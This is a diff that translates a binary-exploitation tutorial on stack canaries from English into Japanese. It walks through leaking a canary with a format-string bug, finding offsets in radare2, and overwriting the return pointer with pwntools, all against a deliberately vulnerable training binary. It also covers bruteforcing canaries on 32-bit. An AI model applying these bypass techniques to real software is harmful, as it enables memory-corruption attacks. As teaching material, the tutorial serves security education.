@@ -1,26 +1,26 @@
 ---
-description: The Buffer Overflow defence
+description: バッファオーバーフローへの防御
 ---
 
-# Stack Canaries
+# スタックカナリア(Stack Canaries)
 
-Stack Canaries are very simple - at the beginning of the function, a random value is placed on the stack. Before the program executes `ret`, the current value of that variable is compared to the initial: if they are the same, no buffer overflow has occurred.
+スタックカナリアはとても単純な仕組みです。関数の冒頭でランダムな値がスタックに置かれ、プログラムが `ret` を実行する前に、その変数の現在の値が最初の値と比較されます。同じであれば、バッファオーバーフローは起きていません。
 
-If they are not, the attacker attempted to overflow to control the return pointer and the program crashes, often with a `***stack smashing detected***` error message.
+異なっていれば、攻撃者が戻りポインタを制御するためにオーバーフローを試みたことになり、プログラムはクラッシュします。多くの場合、`***stack smashing detected***` というエラーメッセージが表示されます。
 
 {% hint style="info" %}
-On Linux, stack canaries end in `00`. This is so that they null-terminate any strings in case you make a mistake when using print functions, but it also makes them much easier to spot.
+Linux では、スタックカナリアは `00` で終わります。これは、print 系の関数を使う際にミスをしても文字列がそこで null 終端されるようにするためですが、そのおかげでカナリアを見つけやすくもなっています。
 {% endhint %}
 
-## Bypassing Canaries
+## カナリアのバイパス
 
-There are two ways to bypass a canary.
+カナリアをバイパスする方法は 2 つあります。
 
-### Leaking it
+### リークする
 
-This is quite broad and will differ from binary to binary, but the main aim is to read the value. The simplest option is using **format string** if it is present - the canary, like other local variables, is on the stack, so if we can leak values off the stack it's easy.
+これはかなり幅広い話で、バイナリごとに異なりますが、狙いは値を読み取ることです。最も簡単なのは、**書式文字列(format string)**があればそれを使うことです。カナリアも他のローカル変数と同じくスタック上にあるので、スタックから値をリークできれば簡単です。
 
-#### Source
+#### ソース
 
 ```c
 #include <stdio.h>
@@ -47,13 +47,13 @@ void win() {
 }
 ```
 
-The source is very simple - it gives you a format string vulnerability, then a buffer overflow vulnerability. The format string we can use to leak the canary value, then we can use that value to overwrite the canary with itself. This way, we can overflow past the canary but not trigger the check as its value remains constant. And of course, we just have to run `win()`.
+ソースはとても単純で、書式文字列の脆弱性のあとに、バッファオーバーフローの脆弱性があります。書式文字列でカナリアの値をリークし、その値でカナリア自身を上書きします。こうすれば、カナリアの値が変わらないのでチェックに引っかからずに、カナリアを越えてオーバーフローできます。あとは `win()` を実行するだけです。
 
-#### 32-bit
+#### 32 ビット
 
 {% file src="../../.gitbook/assets/canary-32.zip" caption="Canary - 32-bit" %}
 
-First let's check there **is** a canary:
+まず、カナリアが**あるか**を確認します。
 
 ```text
 $ pwn checksec vuln-32 
@@ -65,7 +65,7 @@ $ pwn checksec vuln-32
     PIE:      No PIE (0x8048000)
 ```
 
-Yup, there is. Now we need to calculate at what offset the canary is at, and to do this we'll use radare2.
+確かにあります。次にカナリアのオフセットを計算する必要があります。これには radare2 を使います。
 
 ```text
 $ r2 -d -A vuln-32
@@ -84,7 +84,7 @@ hit breakpoint at: 80491d7
 0xffd7cdb0  0x00000001 0xffd7ce84 0xffd7ce8c 0xadc70e00  ................
 ```
 
-The last value there is the canary. We can tell because it's roughly 64 bytes after the "buffer start", which should be close to the end of the buffer. Additionally, it ends in `00` and looks very random, unlike the libc and stack addresses that start with `f7` and `ff`. If we count the number of address it's around 24 until that value, so we go one before and one after as well to make sure.
+最後の値がカナリアです。「バッファの開始位置」からおよそ 64 バイト後にあり、バッファの末尾に近いはずだからです。また、`00` で終わっていてとてもランダムに見えるので、`f7` や `ff` で始まる libc やスタックのアドレスとは違うとわかります。アドレスの数を数えるとその値までおよそ 24 個なので、念のため前後 1 つずつも調べます。
 
 ```text
 $./vuln-32
@@ -94,9 +94,9 @@ Leak me
 0xa4a50300 0xf7fae080 (nil)
 ```
 
-It appears to be at `%23$p`. Remember, stack canaries are randomised for each new process, so it won't be the same.
+`%23$p` にあるようです。スタックカナリアは新しいプロセスごとにランダム化されるので、値は毎回異なる点に注意してください。
 
-Now let's just automate grabbing the canary with pwntools:
+次に、pwntools でカナリアの取得を自動化します。
 
 ```python
 from pwn import *
@@ -117,7 +117,7 @@ $ python3 exploit.py
 [+] Canary: 0xcc987300
 ```
 
-Now all that's left is work out what the offset is until the canary, and then the offset from after the canary to the return pointer.
+あとは、カナリアまでのオフセットと、カナリアの後ろから戻りポインタまでのオフセットを求めるだけです。
 
 ```text
 $ r2 -d -A vuln-32
@@ -131,7 +131,7 @@ hit breakpoint at: 80491d7
 0xffea8af0  0x00000001 0xffea8bc4 0xffea8bcc 0xe1f91c00
 ```
 
-We see the canary is at `0xffea8afc`. A little later on the return pointer \(we assume\) is at `0xffea8b0c`. Let's break just after the next `gets()` and check what value we overwrite it with \(we'll use a De Bruijn pattern\).
+カナリアは `0xffea8afc` にあることがわかります。少しあとにある `0xffea8b0c` が戻りポインタだと考えられます(推測)。次の `gets()` の直後にブレークして、何の値で上書きされたか確認しましょう(De Bruijn パターンを使います)。
 
 ```text
 [0x080491d7]> db 0x0804920f
@@ -145,7 +145,7 @@ hit breakpoint at: 804920f
 0xffea8b0c  0x41416241 0x64414163 0x41654141 0x41416641  AbAAcAAdAAeAAfAA
 ```
 
-Now we can check the canary and EIP offsets:
+これでカナリアと EIP のオフセットを確認できます。
 
 ```text
 [0x0804920f]> wopO 0x41574141
@@ -154,7 +154,7 @@ Now we can check the canary and EIP offsets:
 80
 ```
 
-Return pointer is 16 bytes after the canary start, so 12 bytes after the canary.
+戻りポインタはカナリアの先頭から 16 バイト後、つまりカナリアの末尾から 12 バイト後です。
 
 ```python
 from pwn import *
@@ -178,19 +178,19 @@ p.sendline(payload)
 print(p.clean().decode('latin-1'))
 ```
 
-#### 64-bit
+#### 64 ビット
 
-Same source, same approach, just 64-bit. Try it yourself before checking the solution.
+ソースもアプローチも同じで、64 ビットになっただけです。答えを見る前に、自分で試してみてください。
 
 {% hint style="info" %}
-Remember, in 64-bit format string goes to the relevant registers first and the addresses can fit 8 bytes each so the offset may be different.
+64 ビットでは、書式文字列はまず該当するレジスタを参照し、さらに各アドレスが 8 バイトなので、オフセットが異なる可能性があることを思い出してください。
 {% endhint %}
 
 {% file src="../../.gitbook/assets/canary-64.zip" caption="Canary - 64-bit" %}
 
-### Bruteforcing the Canary
+### カナリアのブルートフォース
 
-This _is_ possible on 32-bit, and sometimes unavoidable. It's not, however, feasible on 64-bit.
+これは 32 ビットでは_可能_で、避けられない場合もあります。しかし 64 ビットでは現実的ではありません。
 
-As you can expect, the general idea is to run the process loads and load of times with random canary values until you get a hit, which you can differentiate by the presence of a known plaintext, e.g. `flag{` and this can take ages to run and is frankly not a particularly interesting challenge.
+想像がつくとおり、基本的な考え方は、当たるまでランダムなカナリア値でプロセスを何度も何度も実行することです。当たったかどうかは、`flag{` のような既知の平文が出力されるかで判別できます。ただし実行に非常に時間がかかり、正直なところあまり面白い問題でもありません。
 
